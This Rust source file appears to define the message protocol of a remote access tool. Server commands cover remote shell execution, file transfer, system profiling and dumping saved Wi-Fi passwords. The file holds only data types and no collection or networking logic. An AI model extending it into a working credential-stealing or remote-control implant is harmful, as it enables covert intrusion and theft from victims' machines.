use serde::{Deserialize, Serialize};
pub mod utils;
use std::fmt;

pub const RESET: &str = "\x1b[0m";
pub const DIM: &str = "\x1b[2m";
pub const BOLD: &str = "\x1b[1m";
pub const GREEN: &str = "\x1b[32m";
pub const YELLOW: &str = "\x1b[33m";
pub const RED: &str = "\x1b[31m";
pub const CYAN: &str = "\x1b[36m";
pub const WHITE: &str = "\x1b[97m";
pub const FILE_CHUNK_SIZE: usize = 64 * 1024;

// Client/Server messages
#[derive(Serialize, Deserialize)]
pub enum ClientMessage {
    // System
    SystemInformation(SystemInformation),
    WifiDump(Vec<WifiPasswords>),

    // File system
    FileHandler(FileHeader),

    // Exec
    ShellOutput(ShellOutput),
    ShellDone,

    // Mic
    Pong,
    Error(String),
}

#[derive(Serialize, Deserialize)]
pub enum InstructMessage {
    // System
    SysInfo,
    WifiDump,
    Check,
    Display(Display),

    // Shell
    Exec(String),
    Shell,

    // FileSystem
    Download(String),
    Upload,

    Close,
}

#[derive(Serialize, Deserialize)]
pub struct WifiPasswords {
    pub ssid: String,
    pub chiper: String,
    pub password: String,
}

impl fmt::Display for WifiPasswords {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(
            f,
            "{}SSID:{} {}{}\n\
             {}Cipher:{} {}{}\n\
             {}Password:{} {}{}",
            CYAN, RESET, WHITE, self.ssid,
            CYAN, RESET, YELLOW, self.chiper,
            CYAN, RESET, GREEN, self.password
        )
    }
}

#[derive(Serialize, Deserialize)]
pub enum ShellCommand {
    Command(String),
    Close, 
}

#[derive(Serialize, Deserialize)]
pub struct Display {
    pub title: String,
    pub content: String,
    pub level: BoxLevel,
}

#[derive(Serialize, Deserialize)]
pub enum BoxLevel {
    Info,
    Warning,
    Error,
}

// AdminStruct
#[derive(Serialize, Deserialize)]
pub enum Privilege {
    Admin,
    User,
}

// File header
#[derive(Serialize, Deserialize)]
pub struct FileHeader {
    pub name: String,
    pub size: u64,
}

#[derive(Serialize, Deserialize)]
pub struct ShellOutput {
    pub stdout: String,
    pub stderr: String,
    pub exit_code: Option<i32>,
}

//  System information
#[derive(Debug, Serialize, Deserialize)]
pub struct SystemInformation {
    pub os: OsInformation,
    pub hardware: HardwareInformation,
    pub memory: MemoryInformation,
    pub processes: Vec<ProcessInformation>,
    pub disks: Vec<DiskInformation>,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct OsInformation {
    pub name: Option<String>,
    pub hostname: Option<String>,
    pub kernel_version: Option<String>,
    pub os_version: Option<String>,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct HardwareInformation {
    pub cpu_brand: String,
    pub cpu_count: usize,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct MemoryInformation {
    pub total_ram: u64,
    pub used_ram: u64,
    pub total_swap: u64,
    pub used_swap: u64,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct ProcessInformation {
    pub pid: u32,
    pub name: String,
    pub cpu_usage: f32,
    pub memory: u64,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct DiskInformation {
    pub name: String,
    pub file_system: String,
    pub total_space: u64,
    pub available_space: u64,
    pub is_removable: bool,
    pub is_read_only: bool,
    pub device_path: String,
}
